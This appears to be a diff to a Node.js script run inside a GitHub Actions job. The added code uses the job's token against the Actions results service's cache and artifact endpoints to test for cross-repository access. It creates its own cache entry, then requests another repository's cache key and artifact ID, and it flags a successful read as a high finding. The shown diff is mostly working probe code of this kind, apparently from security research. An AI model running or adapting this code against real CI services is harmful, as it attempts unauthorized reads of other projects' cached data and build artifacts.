@@ -80,4 +80,49 @@ function call(url, method, headers, body) {
   }
   fs.writeFileSync('reports/twirp-matrix.txt', 'done');
   console.log('TWIRP MATRIX DONE');
+
+  // [4] cache/artifact cross-repo oracle (results host, live endpoints confirmed)
+  const RE = env['ACTIONS_RESULTS_URL'];
+  if (!RE) return;
+  const ORC = { Authorization: 'Bearer ' + TOK, 'Content-Type': 'application/json', Accept: 'application/json' };
+  const KEY_OWN = 'cross-a-' + RUN;
+
+  console.log('== [4] cache cross-repo oracle ==');
+  const rc = await call(RE + 'twirp/github.actions.results.api.v1.CacheService/CreateCacheEntry', 'POST', ORC,
+    JSON.stringify({ key: KEY_OWN, version: VER, size: 15 }));
+  console.log('own create:', rc.status, rc.body.slice(0, 130));
+  const su = (JSON.parse(rc.body).signed_upload_url) || '';
+  if (su) {
+    const ru = await call(su, 'PUT', { 'x-ms-blob-type': 'BlockBlob', 'Content-Length': '15' }, 'own-seed-data-15');
+    console.log('own upload:', ru.status);
+    for (const m of ['FinalizeCacheEntryUpload', 'CommitCacheEntry']) {
+      const rf = await call(RE + 'twirp/github.actions.results.api.v1.CacheService/' + m, 'POST', ORC,
+        JSON.stringify({ key: KEY_OWN, version: VER, size: 15 }));
+      console.log('own finalize(' + m + '):', rf.status, rf.body.slice(0, 130));
+      if (rf.status === 200) break;
+    }
+    await new Promise(res => setTimeout(res, 2000));
+    const rg = await call(RE + 'twirp/github.actions.results.api.v1.CacheService/GetCacheEntryDownloadURL', 'POST', ORC,
+      JSON.stringify({ key: KEY_OWN, version: VER }));
+    console.log('own get:', rg.status, rg.body.slice(0, 160));
+  }
+
+  const rx = await call(RE + 'twirp/github.actions.results.api.v1.CacheService/GetCacheEntryDownloadURL', 'POST', ORC,
+    JSON.stringify({ key: 'cross-b-1', version: VER }));
+  console.log('cross get (key=cross-b-1):', rx.status, rx.body.slice(0, 160),
+    rx.body.includes('"ok":true') ? '  <<< HIGH FINDING (cross-repo cache read)' : '  (miss = isolated or not seeded)');
+
+  console.log('== [5] artifact id differential (GetSignedArtifactURL) ==');
+  const OWN_OLD = 9993261586; // same-repo earlier run artifact
+  const B_ART = parseInt(env['B_ARTIFACT_ID'] || '0', 10);
+  const probes = [OWN_OLD, B_ART].filter(x => x > 0);
+  for (const aid of probes) {
+    const tag = aid === OWN_OLD ? 'own-old' : 'cross-repo';
+    const r = await call(RE + 'twirp/github.actions.results.api.v1.ArtifactService/GetSignedArtifactURL', 'POST', ORC,
+      JSON.stringify({ artifact_id: aid }));
+    console.log('id=' + aid + ' (' + tag + '):', r.status, r.body.slice(0, 160));
+    await new Promise(res => setTimeout(res, 1000));
+  }
+  fs.writeFileSync('reports/oracle-final.txt', 'done');
+  console.log('ORACLE FINAL DONE');
 })().catch(e => { console.error('FATAL', e); process.exit(1); });
